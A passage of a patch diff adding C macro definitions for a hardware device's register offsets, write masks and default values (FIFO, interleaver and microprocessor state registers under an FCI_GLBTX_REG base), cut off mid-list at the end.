+#define ZT_SCR_STATE_DEFAULT   (0x0000)
+#define ZT_SCR_STATE_FMASK     (0x3FFFFFF)
+#define ZT_DTB_CTRL            FCI_GLBTX_REG(0x0050)
+#define ZT_DTB_CTRL_WMASK      (0x1FFF0FFF)
+#define ZT_DTB_CTRL_MASK       (0x1FFF0FFF)
+#define ZT_DTB_CTRL_DEFAULT    (0x0000)
+#define ZT_DTB_CTRL_FMASK      (0x1FFF0FFF)
+#define ZT_DTB_PTRS            FCI_GLBTX_REG(0x0054)
+#define ZT_DTB_PTRS_WMASK      (0xFFFFFFFF)
+#define ZT_DTB_PTRS_MASK       (0xFFFFFFFF)
+#define ZT_DTB_PTRS_DEFAULT    (0x0000)
+#define ZT_DTB_PTRS_FMASK      (0xFFFFFFFF)
+#define ZT_ILVB_WRAD           FCI_GLBTX_REG(0x0058)
+#define ZT_ILVB_WRAD_WMASK     (0xFFFFFFFF)
+#define ZT_ILVB_WRAD_MASK      (0xFFFFFFFF)
+#define ZT_ILVB_WRAD_DEFAULT   (0x0000)
+#define ZT_ILVB_WRAD_FMASK     (0xFFFFFFFF)
+#define ZT_ILVB_RDAD           FCI_GLBTX_REG(0x005C)
+#define ZT_ILVB_RDAD_WMASK     (0xFFFFFFFF)
+#define ZT_ILVB_RDAD_MASK      (0xFFFFFFFF)
+#define ZT_ILVB_RDAD_DEFAULT   (0x0000)
+#define ZT_ILVB_RDAD_FMASK     (0xFFFFFFFF)
+#define ZT_ILVB_WRPTR          FCI_GLBTX_REG(0x0060)
+#define ZT_ILVB_WRPTR_WMASK    (0xFFFFFFFF)
+#define ZT_ILVB_WRPTR_MASK     (0xFFFFFFFF)
+#define ZT_ILVB_WRPTR_DEFAULT  (0x0000)
+#define ZT_ILVB_WRPTR_FMASK    (0xFFFFFFFF)
+#define ZT_ILVB_RDPTR          FCI_GLBTX_REG(0x0064)
+#define ZT_ILVB_RDPTR_WMASK    (0xFFFFFFFF)
+#define ZT_ILVB_RDPTR_MASK     (0xFFFFFFFF)
+#define ZT_ILVB_RDPTR_DEFAULT  (0x0000)
+#define ZT_ILVB_RDPTR_FMASK    (0xFFFFFFFF)
+#define ZT_FIFO_BASE0          FCI_GLBTX_REG(0x0068)
+#define ZT_FIFO_BASE0_WMASK    (0x3FFFFFF)
+#define ZT_FIFO_BASE0_MASK     (0x3FFFFFF)
+#define ZT_FIFO_BASE0_DEFAULT  (0x0000)
+#define ZT_FIFO_BASE0_FMASK    (0x3FFFFFF)
+#define ZT_FIFO_PTRS0          FCI_GLBTX_REG(0x006C)
+#define ZT_FIFO_PTRS0_WMASK    (0xC0FF00FF)
+#define ZT_FIFO_PTRS0_MASK     (0xC0FF00FF)
+#define ZT_FIFO_PTRS0_DEFAULT  (0x0000)
+#define ZT_FIFO_PTRS0_FMASK    (0xC0FF00FF)
+#define ZT_FIFO_CNST0          FCI_GLBTX_REG(0x0070)
+#define ZT_FIFO_CNST0_WMASK    (0xFFFFFF)
+#define ZT_FIFO_CNST0_MASK     (0xFFFFFF)
+#define ZT_FIFO_CNST0_DEFAULT  (0x0000)
+#define ZT_FIFO_CNST0_FMASK    (0xFFFFFF)
+#define ZT_FIFO_BASE1          FCI_GLBTX_REG(0x0074)
+#define ZT_FIFO_BASE1_WMASK    (0x3FFFFFF)
+#define ZT_FIFO_BASE1_MASK     (0x3FFFFFF)
+#define ZT_FIFO_BASE1_DEFAULT  (0x0000)
+#define ZT_FIFO_BASE1_FMASK    (0x3FFFFFF)
+#define ZT_FIFO_PTRS1          FCI_GLBTX_REG(0x0078)
+#define ZT_FIFO_PTRS1_WMASK    (0xC0FF00FF)
+#define ZT_FIFO_PTRS1_MASK     (0xC0FF00FF)
+#define ZT_FIFO_PTRS1_DEFAULT  (0x0000)
+#define ZT_FIFO_PTRS1_FMASK    (0xC0FF00FF)
+#define ZT_FIFO_CNST1          FCI_GLBTX_REG(0x007C)
+#define ZT_FIFO_CNST1_WMASK    (0xFFFFFF)
+#define ZT_FIFO_CNST1_MASK     (0xFFFFFF)
+#define ZT_FIFO_CNST1_DEFAULT  (0x0000)
+#define ZT_FIFO_CNST1_FMASK    (0xFFFFFF)
+#define ZT_FIFO_BASE2          FCI_GLBTX_REG(0x0080)
+#define ZT_FIFO_BASE2_WMASK    (0x3FFFFFF)
+#define ZT_FIFO_BASE2_MASK     (0x3FFFFFF)
+#define ZT_FIFO_BASE2_DEFAULT  (0x0000)
+#define ZT_FIFO_BASE2_FMASK    (0x3FFFFFF)
+#define ZT_FIFO_PTRS2          FCI_GLBTX_REG(0x0084)
+#define ZT_FIFO_PTRS2_WMASK    (0xC0FF00FF)
+#define ZT_FIFO_PTRS2_MASK     (0xC0FF00FF)
+#define ZT_FIFO_PTRS2_DEFAULT  (0x0000)
+#define ZT_FIFO_PTRS2_FMASK    (0xC0FF00FF)
+#define ZT_FIFO_CNST2          FCI_GLBTX_REG(0x0088)
+#define ZT_FIFO_CNST2_WMASK    (0xFFFFFF)
+#define ZT_FIFO_CNST2_MASK     (0xFFFFFF)
+#define ZT_FIFO_CNST2_DEFAULT  (0x0000)
+#define ZT_FIFO_CNST2_FMASK    (0xFFFFFF)
+#define ZT_FIFO_BASE3          FCI_GLBTX_REG(0x008C)
+#define ZT_FIFO_BASE3_WMASK    (0x3FFFFFFF)
+#define ZT_FIFO_BASE3_MASK     (0x3FFFFFFF)
+#define ZT_FIFO_BASE3_DEFAULT  (0x0000)
+#define ZT_FIFO_BASE3_FMASK    (0x3FFFFFFF)
+#define ZT_FIFO_PTRS3          FCI_GLBTX_REG(0x0090)
+#define ZT_FIFO_PTRS3_WMASK    (0xCFFF0FFF)
+#define ZT_FIFO_PTRS3_MASK     (0xCFFF0FFF)
+#define ZT_FIFO_PTRS3_DEFAULT  (0x0000)
+#define ZT_FIFO_PTRS3_FMASK    (0xCFFF0FFF)
+#define ZT_FIFO_CNST3          FCI_GLBTX_REG(0x0094)
+#define ZT_FIFO_CNST3_WMASK    (0x1FFFFFF)
+#define ZT_FIFO_CNST3_MASK     (0x1FFFFFF)
+#define ZT_FIFO_CNST3_DEFAULT  (0x0000)
+#define ZT_FIFO_CNST3_FMASK    (0x1FFFFFF)
+#define ZT_DEPTH               FCI_GLBTX_REG(0x0098)
+#define ZT_DEPTH_WMASK         (0xFFFFFFFF)
+#define ZT_DEPTH_MASK          (0xFFFFFFFF)
+#define ZT_DEPTH_DEFAULT       (0x0000)
+#define ZT_DEPTH_FMASK         (0xFFFFFFFF)
+#define ZT_ILV_PARAMS0         FCI_GLBTX_REG(0x009C)
+#define ZT_ILV_PARAMS0_WMASK   (0xFFFFFF07)
+#define ZT_ILV_PARAMS0_MASK    (0xFFFFFF17)
+#define ZT_ILV_PARAMS0_DEFAULT (0x0000)
+#define ZT_ILV_PARAMS0_FMASK   (0xFFFFFF07)
+#define ZT_ILV_BASE0           FCI_GLBTX_REG(0x00A0)
+#define ZT_ILV_BASE0_WMASK     (0x3FFFF)
+#define ZT_ILV_BASE0_MASK      (0x3FFFF)
+#define ZT_ILV_BASE0_DEFAULT   (0x0000)
+#define ZT_ILV_BASE0_FMASK     (0x3FFFF)
+#define ZT_ILV_SIZE0           FCI_GLBTX_REG(0x00A4)
+#define ZT_ILV_SIZE0_WMASK     (0xFFFFFF)
+#define ZT_ILV_SIZE0_MASK      (0xFFFFFF)
+#define ZT_ILV_SIZE0_DEFAULT   (0x0000)
+#define ZT_ILV_SIZE0_FMASK     (0xFFFFFF)
+#define ZT_ILV_MAX_FULLNESS0   FCI_GLBTX_REG(0x00A8)
+#define ZT_ILV_MAX_FULLNESS0_WMASK (0x3FFFF)
+#define ZT_ILV_MAX_FULLNESS0_MASK (0x3FFFF)
+#define ZT_ILV_MAX_FULLNESS0_DEFAULT (0x0000)
+#define ZT_ILV_MAX_FULLNESS0_FMASK (0x3FFFF)
+#define ZT_ILV_MIN_FULLNESS0   FCI_GLBTX_REG(0x00AC)
+#define ZT_ILV_MIN_FULLNESS0_WMASK (0x3FFFF)
+#define ZT_ILV_MIN_FULLNESS0_MASK (0x3FFFF)
+#define ZT_ILV_MIN_FULLNESS0_DEFAULT (0x0000)
+#define ZT_ILV_MIN_FULLNESS0_FMASK (0x3FFFF)
+#define ZT_ILV_FULLNESS0       FCI_GLBTX_REG(0x00B0)
+#define ZT_ILV_FULLNESS0_WMASK (0x3FFFF)
+#define ZT_ILV_FULLNESS0_MASK  (0x3FFFF)
+#define ZT_ILV_FULLNESS0_DEFAULT (0x0000)
+#define ZT_ILV_FULLNESS0_FMASK (0x3FFFF)
+#define ZT_ILV_CNTRS0          FCI_GLBTX_REG(0x00B4)
+#define ZT_ILV_CNTRS0_WMASK    (0xFFFF0000)
+#define ZT_ILV_CNTRS0_MASK     (0xFFFF0000)
+#define ZT_ILV_CNTRS0_DEFAULT  (0x0000)
+#define ZT_ILV_CNTRS0_FMASK    (0xFFFF0000)
+#define ZT_ILV_PMS_CNTRS0      FCI_GLBTX_REG(0x00B8)
+#define ZT_ILV_PMS_CNTRS0_WMASK (0xFFFFFFFF)
+#define ZT_ILV_PMS_CNTRS0_MASK (0xFFFFFFFF)
+#define ZT_ILV_PMS_CNTRS0_DEFAULT (0x0000)
+#define ZT_ILV_PMS_CNTRS0_FMASK (0xFFFFFFFF)
+#define ZT_ILV_PMD_CNTRS0      FCI_GLBTX_REG(0x00BC)
+#define ZT_ILV_PMD_CNTRS0_WMASK (0xFFFFFFFF)
+#define ZT_ILV_PMD_CNTRS0_MASK (0xFFFFFFFF)
+#define ZT_ILV_PMD_CNTRS0_DEFAULT (0x0000)
+#define ZT_ILV_PMD_CNTRS0_FMASK (0xFFFFFFFF)
+#define ZT_ILV_PARAMS1         FCI_GLBTX_REG(0x00C0)
+#define ZT_ILV_PARAMS1_WMASK   (0xFFFFFF07)
+#define ZT_ILV_PARAMS1_MASK    (0xFFFFFF17)
+#define ZT_ILV_PARAMS1_DEFAULT (0x0000)
+#define ZT_ILV_PARAMS1_FMASK   (0xFFFFFF07)
+#define ZT_ILV_BASE1           FCI_GLBTX_REG(0x00C4)
+#define ZT_ILV_BASE1_WMASK     (0x3FFFF)
+#define ZT_ILV_BASE1_MASK      (0x3FFFF)
+#define ZT_ILV_BASE1_DEFAULT   (0x0000)
+#define ZT_ILV_BASE1_FMASK     (0x3FFFF)
+#define ZT_ILV_SIZE1           FCI_GLBTX_REG(0x00C8)
+#define ZT_ILV_SIZE1_WMASK     (0xFFFFFF)
+#define ZT_ILV_SIZE1_MASK      (0xFFFFFF)
+#define ZT_ILV_SIZE1_DEFAULT   (0x0000)
+#define ZT_ILV_SIZE1_FMASK     (0xFFFFFF)
+#define ZT_ILV_MAX_FULLNESS1   FCI_GLBTX_REG(0x00CC)
+#define ZT_ILV_MAX_FULLNESS1_WMASK (0x3FFFF)
+#define ZT_ILV_MAX_FULLNESS1_MASK (0x3FFFF)
+#define ZT_ILV_MAX_FULLNESS1_DEFAULT (0x0000)
+#define ZT_ILV_MAX_FULLNESS1_FMASK (0x3FFFF)
+#define ZT_ILV_MIN_FULLNESS1   FCI_GLBTX_REG(0x00D0)
+#define ZT_ILV_MIN_FULLNESS1_WMASK (0x3FFFF)
+#define ZT_ILV_MIN_FULLNESS1_MASK (0x3FFFF)
+#define ZT_ILV_MIN_FULLNESS1_DEFAULT (0x0000)
+#define ZT_ILV_MIN_FULLNESS1_FMASK (0x3FFFF)
+#define ZT_ILV_FULLNESS1       FCI_GLBTX_REG(0x00D4)
+#define ZT_ILV_FULLNESS1_WMASK (0x3FFFF)
+#define ZT_ILV_FULLNESS1_MASK  (0x3FFFF)
+#define ZT_ILV_FULLNESS1_DEFAULT (0x0000)
+#define ZT_ILV_FULLNESS1_FMASK (0x3FFFF)
+#define ZT_ILV_CNTRS1          FCI_GLBTX_REG(0x00D8)
+#define ZT_ILV_CNTRS1_WMASK    (0xFFFF0000)
+#define ZT_ILV_CNTRS1_MASK     (0xFFFF0000)
+#define ZT_ILV_CNTRS1_DEFAULT  (0x0000)
+#define ZT_ILV_CNTRS1_FMASK    (0xFFFF0000)
+#define ZT_ILV_PMS_CNTRS1      FCI_GLBTX_REG(0x00DC)
+#define ZT_ILV_PMS_CNTRS1_WMASK (0xFFFFFFFF)
+#define ZT_ILV_PMS_CNTRS1_MASK (0xFFFFFFFF)
+#define ZT_ILV_PMS_CNTRS1_DEFAULT (0x0000)
+#define ZT_ILV_PMS_CNTRS1_FMASK (0xFFFFFFFF)
+#define ZT_ILV_PMD_CNTRS1      FCI_GLBTX_REG(0x00E0)
+#define ZT_ILV_PMD_CNTRS1_WMASK (0xFFFFFFFF)
+#define ZT_ILV_PMD_CNTRS1_MASK (0xFFFFFFFF)
+#define ZT_ILV_PMD_CNTRS1_DEFAULT (0x0000)
+#define ZT_ILV_PMD_CNTRS1_FMASK (0xFFFFFFFF)
+#define ZT_CHECKBYTE0          FCI_GLBTX_REG(0x00E4)
+#define ZT_CHECKBYTE0_WMASK    (0xFFFFFFFF)
+#define ZT_CHECKBYTE0_MASK     (0xFFFFFFFF)
+#define ZT_CHECKBYTE0_DEFAULT  (0x0000)
+#define ZT_CHECKBYTE0_FMASK    (0xFFFFFFFF)
+#define ZT_CHECKBYTE1          FCI_GLBTX_REG(0x00E8)
+#define ZT_CHECKBYTE1_WMASK    (0xFFFFFFFF)
+#define ZT_CHECKBYTE1_MASK     (0xFFFFFFFF)
+#define ZT_CHECKBYTE1_DEFAULT  (0x0000)
+#define ZT_CHECKBYTE1_FMASK    (0xFFFFFFFF)
+#define ZT_CHECKBYTE2          FCI_GLBTX_REG(0x00EC)
+#define ZT_CHECKBYTE2_WMASK    (0xFFFFFFFF)
+#define ZT_CHECKBYTE2_MASK     (0xFFFFFFFF)
+#define ZT_CHECKBYTE2_DEFAULT  (0x0000)
+#define ZT_CHECKBYTE2_FMASK    (0xFFFFFFFF)
+#define ZT_CHECKBYTE3          FCI_GLBTX_REG(0x00F0)
+#define ZT_CHECKBYTE3_WMASK    (0xFFFFFFFF)
+#define ZT_CHECKBYTE3_MASK     (0xFFFFFFFF)
+#define ZT_CHECKBYTE3_DEFAULT  (0x0000)
+#define ZT_CHECKBYTE3_FMASK    (0xFFFFFFFF)
+#define ZT_TCSRC_STATE         FCI_GLBTX_REG(0x00F4)
+#define ZT_TCSRC_STATE_WMASK   (0xFFFFFF)
+#define ZT_TCSRC_STATE_MASK    (0xFFFFFF)
+#define ZT_TCSRC_STATE_DEFAULT (0x0000)
+#define ZT_TCSRC_STATE_FMASK   (0xFFFFFF)
+#define ZT_UPROC_ENA           FCI_GLBTX_REG(0x00F8)
+#define ZT_UPROC_ENA_WMASK     (0x03FF)
+#define ZT_UPROC_ENA_MASK      (0x03FF)
+#define ZT_UPROC_ENA_DEFAULT   (0x0000)
+#define ZT_UPROC_ENA_FMASK     (0x03FF)
+#define ZT_UPROC01_BASE        FCI_GLBTX_REG(0x00FC)
+#define ZT_UPROC01_BASE_WMASK  (0xFFFFFFFF)
+#define ZT_UPROC01_BASE_MASK   (0xFFFFFFFF)
+#define ZT_UPROC01_BASE_DEFAULT (0x0000)
+#define ZT_UPROC01_BASE_FMASK  (0xFFFFFFFF)
+#define ZT_UPROC23_BASE        FCI_GLBTX_REG(0x0100)
+#define ZT_UPROC23_BASE_WMASK  (0xFFFFFFFF)
+#define ZT_UPROC23_BASE_MASK   (0xFFFFFFFF)
+#define ZT_UPROC23_BASE_DEFAULT (0x0000)
+#define ZT_UPROC23_BASE_FMASK  (0xFFFFFFFF)
+#define ZT_UPROC45_BASE        FCI_GLBTX_REG(0x0104)
+#define ZT_UPROC45_BASE_WMASK  (0xFFFFFFFF)
+#define ZT_UPROC45_BASE_MASK   (0xFFFFFFFF)
+#define ZT_UPROC45_BASE_DEFAULT (0x0000)
+#define ZT_UPROC45_BASE_FMASK  (0xFFFFFFFF)
+#define ZT_UPROC67_BASE        FCI_GLBTX_REG(0x0108)
+#define ZT_UPROC67_BASE_WMASK  (0xFFFFFFFF)
+#define ZT_UPROC67_BASE_MASK   (0xFFFFFFFF)
+#define ZT_UPROC67_BASE_DEFAULT (0x0000)
+#define ZT_UPROC67_BASE_FMASK  (0xFFFFFFFF)
+#define ZT_UPROC89_BASE        FCI_GLBTX_REG(0x010C)
+#define ZT_UPROC89_BASE_WMASK  (0xFFFFFFFF)
+#define ZT_UPROC89_BASE_MASK   (0xFFFFFFFF)
+#define ZT_UPROC89_BASE_DEFAULT (0x0000)
+#define ZT_UPROC89_BASE_FMASK  (0xFFFFFFFF)
+#define ZT_UPROC_INT           FCI_GLBTX_REG(0x0110)
+#define ZT_UPROC_INT_WMASK     (0x03FF)
+#define ZT_UPROC_INT_MASK      (0x03FF)
+#define ZT_UPROC_INT_DEFAULT   (0x0000)
+#define ZT_UPROC_INT_FMASK     (0x03FF)
+#define ZT_UPROC0_STATE0       FCI_GLBTX_REG(0x0114)
+#define ZT_UPROC0_STATE0_WMASK (0xFFFFFF00)
+#define ZT_UPROC0_STATE0_MASK  (0xFFFFFFFF)
+#define ZT_UPROC0_STATE0_DEFAULT (0x0000)
+#define ZT_UPROC0_STATE0_FMASK (0xFFFFFFFF)
+#define ZT_UPROC0_STATE1       FCI_GLBTX_REG(0x0118)
+#define ZT_UPROC0_STATE1_WMASK (0xFFFFFFFF)
+#define ZT_UPROC0_STATE1_MASK  (0xFFFFFFFF)
+#define ZT_UPROC0_STATE1_DEFAULT (0x0000)
+#define ZT_UPROC0_STATE1_FMASK (0xFFFFFFFF)
+#define ZT_UPROC0_STATE2       FCI_GLBTX_REG(0x011C)
+#define ZT_UPROC0_STATE2_WMASK (0xFFFFFFFF)
+#define ZT_UPROC0_STATE2_MASK  (0xFFFFFFFF)
+#define ZT_UPROC0_STATE2_DEFAULT (0x0000)
+#define ZT_UPROC0_STATE2_FMASK (0xFFFFFFFF)
+#define ZT_UPROC0_STATE3       FCI_GLBTX_REG(0x0120)
+#define ZT_UPROC0_STATE3_WMASK (0xFFFFFFFF)
+#define ZT_UPROC0_STATE3_MASK  (0xFFFFFFFF)
+#define ZT_UPROC0_STATE3_DEFAULT (0x0000)
+#define ZT_UPROC0_STATE3_FMASK (0xFFFFFFFF)
+#define ZT_UPROC0_STATE4       FCI_GLBTX_REG(0x0124)
+#define ZT_UPROC0_STATE4_WMASK (0xFFFFFFFF)
+#define ZT_UPROC0_STATE4_MASK  (0xFFFFFFFF)
+#define ZT_UPROC0_STATE4_DEFAULT (0x0000)
+#define ZT_UPROC0_STATE4_FMASK (0xFFFFFFFF)
+#define ZT_UPROC1_STATE0       FCI_GLBTX_REG(0x0128)
+#define ZT_UPROC1_STATE0_WMASK (0xFFFFFF00)
+#define ZT_UPROC1_STATE0_MASK  (0xFFFFFFFF)
+#define ZT_UPROC1_STATE0_DEFAULT (0x0000)
+#define ZT_UPROC1_STATE0_FMASK (0xFFFFFFFF)
+#define ZT_UPROC1_STATE1       FCI_GLBTX_REG(0x012C)
+#define ZT_UPROC1_STATE1_WMASK (0xFFFFFFFF)
+#define ZT_UPROC1_STATE1_MASK  (0xFFFFFFFF)
+#define ZT_UPROC1_STATE1_DEFAULT (0x0000)
+#define ZT_UPROC1_STATE1_FMASK (0xFFFFFFFF)
+#define ZT_UPROC1_STATE2       FCI_GLBTX_REG(0x0130)
+#define ZT_UPROC1_STATE2_WMASK (0xFFFFFFFF)
+#define ZT_UPROC1_STATE2_MASK  (0xFFFFFFFF)
+#define ZT_UPROC1_STATE2_DEFAULT (0x0000)
+#define ZT_UPROC1_STATE2_FMASK (0xFFFFFFFF)
+#define ZT_UPROC1_STATE3       FCI_GLBTX_REG(0x0134)
+#define ZT_UPROC1_STATE3_WMASK (0xFFFFFFFF)
+#define ZT_UPROC1_STATE3_MASK  (0xFFFFFFFF)
+#define ZT_UPROC1_STATE3_DEFAULT (0x0000)
+#define ZT_UPROC1_STATE3_FMASK (0xFFFFFFFF)
+#define ZT_UPROC1_STATE4       FCI_GLBTX_REG(0x0138)
+#define ZT_UPROC1_STATE4_WMASK (0xFFFFFFFF)
+#define ZT_UPROC1_STATE4_MASK  (0xFFFFFFFF)
+#define ZT_UPROC1_STATE4_DEFAULT (0x0000)
+#define ZT_UPROC1_STATE4_FMASK (0xFFFFFFFF)
+#define ZT_UPROC2_STATE0       FCI_GLBTX_REG(0x013C)
+#define ZT_UPROC2_STATE0_WMASK (0xFFFFFF00)
+#define ZT_UPROC2_STATE0_MASK  (0xFFFFFFFF)
+#define ZT_UPROC2_STATE0_DEFAULT (0x0000)
+#define ZT_UPROC2_STATE0_FMASK (0xFFFFFFFF)
+#define ZT_UPROC2_STATE1       FCI_GLBTX_REG(0x0140)
+#define ZT_UPROC2_STATE1_WMASK (0xFFFFFFFF)
+#define ZT_UPROC2_STATE1_MASK  (0xFFFFFFFF)
+#define ZT_UPROC2_STATE1_DEFAULT (0x0000)
+#define ZT_UPROC2_STATE1_FMASK (0xFFFFFFFF)
+#define ZT_UPROC2_STATE2       FCI_GLBTX_REG(0x0144)
+#define ZT_UPROC2_STATE2_WMASK (0xFFFFFFFF)
+#define ZT_UPROC2_STATE2_MASK  (0xFFFFFFFF)
+#define ZT_UPROC2_STATE2_DEFAULT (0x0000)
+#define ZT_UPROC2_STATE2_FMASK (0xFFFFFFFF)
+#define ZT_UPROC2_STATE3       FCI_GLBTX_REG(0x0148)
+#define ZT_UPROC2_STATE3_WMASK (0xFFFFFFFF)
+#define ZT_UPROC2_STATE3_MASK  (0xFFFFFFFF)
+#define ZT_UPROC2_STATE3_DEFAULT (0x0000)
+#define ZT_UPROC2_STATE3_FMASK (0xFFFFFFFF)
+#define ZT_UPROC2_STATE4       FCI_GLBTX_REG(0x014C)
+#define ZT_UPROC2_STATE4_WMASK (0xFFFFFFFF)
+#define ZT_UPROC2_STATE4_MASK  (0xFFFFFFFF)
+#define ZT_UPROC2_STATE4_DEFAULT (0x0000)
+#define ZT_UPROC2_STATE4_FMASK (0xFFFFFFFF)
+#define ZT_UPROC3_STATE0       FCI_GLBTX_REG(0x0150)
+#define ZT_UPROC3_STATE0_WMASK (0xFFFFFF00)
+#define ZT_UPROC3_STATE0_MASK  (0xFFFFFFFF)
+#define ZT_UPROC3_STATE0_DEFAULT (0x0000)
+#define ZT_UPROC3_STATE0_FMASK (0xFFFFFFFF)
+#define ZT_UPROC3_STATE1       FCI_GLBTX_REG(0x0154)
+#define ZT_UPROC3_STATE1_WMASK (0xFFFFFFFF)
+#define ZT_UPROC3_STATE1_MASK  (0xFFFFFFFF)
+#define ZT_UPROC3_STATE1_DEFAULT (0x0000)
+#define ZT_UPROC3_STATE1_FMASK (0xFFFFFFFF)
+#define ZT_UPROC3_STATE2       FCI_GLBTX_REG(0x0158)
+#define ZT_UPROC3_STATE2_WMASK (0xFFFFFFFF)
+#define ZT_UPROC3_STATE2_MASK  (0xFFFFFFFF)
+#define ZT_UPROC3_STATE2_DEFAULT (0x0000)
+#define ZT_UPROC3_STATE2_FMASK (0xFFFFFFFF)
+#define ZT_UPROC3_STATE3       FCI_GLBTX_REG(0x015C)
+#define ZT_UPROC3_STATE3_WMASK (0xFFFFFFFF)
+#define ZT_UPROC3_STATE3_MASK  (0xFFFFFFFF)
+#define ZT_UPROC3_STATE3_DEFAULT (0x0000)
+#define ZT_UPROC3_STATE3_FMASK (0xFFFFFFFF)
+#define ZT_UPROC3_STATE4       FCI_GLBTX_REG(0x0160)
+#define ZT_UPROC3_STATE4_WMASK (0xFFFFFFFF)
+#define ZT_UPROC3_STATE4_MASK  (0xFFFFFFFF)
+#define ZT_UPROC3_STATE4_DEFAULT (0x0000)
+#define ZT_UPROC3_STATE4_FMASK (0xFFFFFFFF)
+#define ZT_UPROC4_STATE0       FCI_GLBTX_REG(0x0164)
+#define ZT_UPROC4_STATE0_WMASK (0xFFFFFF00)
+#define ZT_UPROC4_STATE0_MASK  (0xFFFFFFFF)
+#define ZT_UPROC4_STATE0_DEFAULT (0x0000)
+#define ZT_UPROC4_STATE0_FMASK (0xFFFFFFFF)
+#define ZT_UPROC4_STATE1       FCI_GLBTX_REG(0x0168)
+#define ZT_UPROC4_STATE1_WMASK (0xFFFFFFFF)
+#define ZT_UPROC4_STATE1_MASK  (0xFFFFFFFF)
+#define ZT_UPROC4_STATE1_DEFAULT (0x0000)
+#define ZT_UPROC4_STATE1_FMASK (0xFFFFFFFF)
+#define ZT_UPROC4_STATE2       FCI_GLBTX_REG(0x016C)
+#define ZT_UPROC4_STATE2_WMASK (0xFFFFFFFF)
+#define ZT_UPROC4_STATE2_MASK  (0xFFFFFFFF)
+#define ZT_UPROC4_STATE2_DEFAULT (0x0000)
+#define ZT_UPROC4_STATE2_FMASK (0xFFFFFFFF)
+#define ZT_UPROC4_STATE3       FCI_GLBTX_REG(0x0170)
+#define ZT_UPROC4_STATE3_WMASK (0xFFFFFFFF)
+#define ZT_UPROC4_STATE3_MASK  (0xFFFFFFFF)
+#define ZT_UPROC4_STATE3_DEFAULT (0x0000)
+#define ZT_UPROC4_STATE3_FMASK (0xFFFFFFFF)
+#define ZT_UPROC4_STATE4       FCI_GLBTX_REG(0x0174)
+#define ZT_UPROC4_STATE4_WMASK (0xFFFFFFFF)
+#define ZT_UPROC4_STATE4_MASK  (0xFFFFFFFF)
+#define ZT_UPROC4_STATE4_DEFAULT (0x0000)
+#define ZT_UPROC4_STATE4_FMASK (0xFFFFFFFF)
+#define ZT_UPROC5_STATE0       FCI_GLBTX_REG(0x0178)
+#define ZT_UPROC5_STATE0_WMASK (0xFFFFFF00)
+#define ZT_UPROC5_STATE0_MASK  (0xFFFFFFFF)
+#define ZT_UPROC5_STATE0_DEFAULT (0x0000)
+#define ZT_UPROC5_STATE0_FMASK (0xFFFFFFFF)
+#define ZT_UPROC5_STATE1       FCI_GLBTX_REG(0x017C)
+#define ZT_UPROC5_STATE1_WMASK (0xFFFFFFFF)
+#define ZT_UPROC5_STATE1_MASK  (0xFFFFFFFF)
+#define ZT_UPROC5_STATE1_DEFAULT (0x0000)
+#define ZT_UPROC5_STATE1_FMASK (0xFFFFFFFF)
+#define ZT_UPROC5_STATE2       FCI_GLBTX_REG(0x0180)
+#define ZT_UPROC5_STATE2_WMASK (0xFFFFFFFF)
+#define ZT_UPROC5_STATE2_MASK  (0xFFFFFFFF)
+#define ZT_UPROC5_STATE2_DEFAULT (0x0000)
+#define ZT_UPROC5_STATE2_FMASK (0xFFFFFFFF)
+#define ZT_UPROC5_STATE3       FCI_GLBTX_REG(0x0184)
+#define ZT_UPROC5_STATE3_WMASK (0xFFFFFFFF)
+#define ZT_UPROC5_STATE3_MASK  (0xFFFFFFFF)
+#define ZT_UPROC5_STATE3_DEFAULT (0x0000)
+#define ZT_UPROC5_STATE3_FMASK (0xFFFFFFFF)
+#define ZT_UPROC5_STATE4       FCI_GLBTX_REG(0x0188)
+#define ZT_UPROC5_STATE4_WMASK (0xFFFFFFFF)
+#define ZT_UPROC5_STATE4_MASK  (0xFFFFFFFF)
+#define ZT_UPROC5_STATE4_DEFAULT (0x0000)
+#define ZT_UPROC5_STATE4_FMASK (0xFFFFFFFF)
+#define ZT_UPROC6_STATE0       FCI_GLBTX_REG(0x018C)
+#define ZT_UPROC6_STATE0_WMASK (0xFFFFFF00)
+#define ZT_UPROC6_STATE0_MASK  (0xFFFFFFFF)
+#define ZT_UPROC6_STATE0_DEFAULT (0x0000)
+#define ZT_UPROC6_STATE0_FMASK (0xFFFFFFFF)
+#define ZT_UPROC6_STATE1       FCI_GLBTX_REG(0x0190)
+#define ZT_UPROC6_STATE1_WMASK (0xFFFFFFFF)
+#define ZT_UPROC6_STATE1_MASK  (0xFFFFFFFF)
+#define ZT_UPROC6_STATE1_DEFAULT (0x0000)
+#define ZT_UPROC6_STATE1_FMASK (0xFFFFFFFF)
+#define ZT_UPROC6_STATE2       FCI_GLBTX_REG(0x0194)
+#define ZT_UPROC6_STATE2_WMASK (0xFFFFFFFF)
+#define ZT_UPROC6_STATE2_MASK  (0xFFFFFFFF)
+#define ZT_UPROC6_STATE2_DEFAULT (0x0000)
+#define ZT_UPROC6_STATE2_FMASK (0xFFFFFFFF)
+#define ZT_UPROC6_STATE3       FCI_GLBTX_REG(0x0198)
+#define ZT_UPROC6_STATE3_WMASK (0xFFFFFFFF)
+#define ZT_UPROC6_STATE3_MASK  (0xFFFFFFFF)
+#define ZT_UPROC6_STATE3_DEFAULT (0x0000)
+#define ZT_UPROC6_STATE3_FMASK (0xFFFFFFFF)
+#define ZT_UPROC6_STATE4       FCI_GLBTX_REG(0x019C)
+#define ZT_UPROC6_STATE4_WMASK (0xFFFFFFFF)
+#define ZT_UPROC6_STATE4_MASK  (0xFFFFFFFF)
+#define ZT_UPROC6_STATE4_DEFAULT (0x0000)
+#define ZT_UPROC6_STATE4_FMASK (0xFFFFFFFF)
+#define ZT_UPROC7_STATE0       FCI_GLBTX_REG(0x01A0)
+#define ZT_UPROC7_STATE0_WMASK (0xFFFFFF00)
+#define ZT_UPROC7_STATE0_MASK  (0xFFFFFFFF)
+#define ZT_UPROC7_STATE0_DEFAULT (0x0000)
+#define ZT_UPROC7_STATE0_FMASK (0xFFFFFFFF)
+#define ZT_UPROC7_STATE1       FCI_GLBTX_REG(0x01A4)
+#define ZT_UPROC7_STATE1_WMASK (0xFFFFFFFF)
+#define ZT_UPROC7_STATE1_MASK  (0xFFFFFFFF)
+#define ZT_UPROC7_STATE1_DEFAULT (0x0000)
+#define ZT_UPROC7_STATE1_FMASK (0xFFFFFFFF)
+#define ZT_UPROC7_STATE2       FCI_GLBTX_REG(0x01A8)
+#define ZT_UPROC7_STATE2_WMASK (0xFFFFFFFF)
+#define ZT_UPROC7_STATE2_MASK  (0xFFFFFFFF)
